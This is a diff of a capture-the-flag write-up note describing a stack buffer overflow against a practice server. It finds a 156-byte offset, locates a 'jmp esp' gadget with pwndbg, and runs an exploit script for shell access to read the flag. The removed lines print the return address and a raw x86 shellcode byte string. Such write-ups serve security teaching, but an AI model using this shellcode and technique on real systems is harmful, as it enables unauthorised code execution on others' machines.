@@ -18,45 +18,17 @@ sF3iUtuwHsfYphKvQZjZp7EczBF4VjHplrQXVojWnv6Ns9m5YRpxMX0OEfCRn5I28hTD4BYrYXvz4hCU
 
 ![[Pasted image 20241115174836.png]]
 
-The EIP tells us that the padding ended before EQoC from the random string, 
+The EIP tells us that the padding ended before EQoC from the random string. Count the number of letters before EQoC, which is 156.
 
-Run binary file and attempt to crash when output equals "... , But nothing ever".
+Next step is to use pwndbg to find 'jmp esp'. This is done by running template.py with padding equal 156 and GDB as a debugger to the PID template.py is running on. 
 
+![[Pasted image 20241115175121.png]]
 
+Now back to template.py, add 'jmp esp' as a payload and add the payload from the previous CTF "Strawberry Exploit".
 
-Padding is equal to 156, so I proceed by finding the return address of the binary file (jmp esp)
+Lastly, run template.py at koala2.hackingarena.no at port 805 using command:
+python3 template.py koala2.hackingarena.no 805
 
-Edit template.py to match padding of 156
+We should now have access to the web server and can run 'ls' and 'cat' to output the flag.
 
-
-
-
-Run template.py and debug using GDB, then search and find 'jmp esp'
-
-
-
-Run template.py, debug and search for 'jmp esp' using pwndbg:
-
-search --asm 'jmp esp'
-
-
-
-Add a payload for template.py:
-payload+= p32(0x8049243)
-
-Edit template.py and include 'jmp esp' as a payload.
-
-
-
-Add another payload, the same payload from the strawberry CTF.
-payload+='\x99\x52\x58\x52\xbf\xb7\x97\x39\x34\x01\xff\x57\xbf\x97\x17\xb1\x34\x01\xff\x47\x57\x89\xe3\x52\x53\x89\xe1\xb0\x63\x2c\x58\x81\xef\x62\xae\x61\x69\x57\xff\xd4'
-
-Additionally, add the payload used in "Strawberry Exploit".
-
-
-Lastly, run template.py on web server and port.
-
-"cat flag" to find CTF flag
-# Additional Info
-
-Additional solution / info
+![[Pasted image 20241115175352.png]]
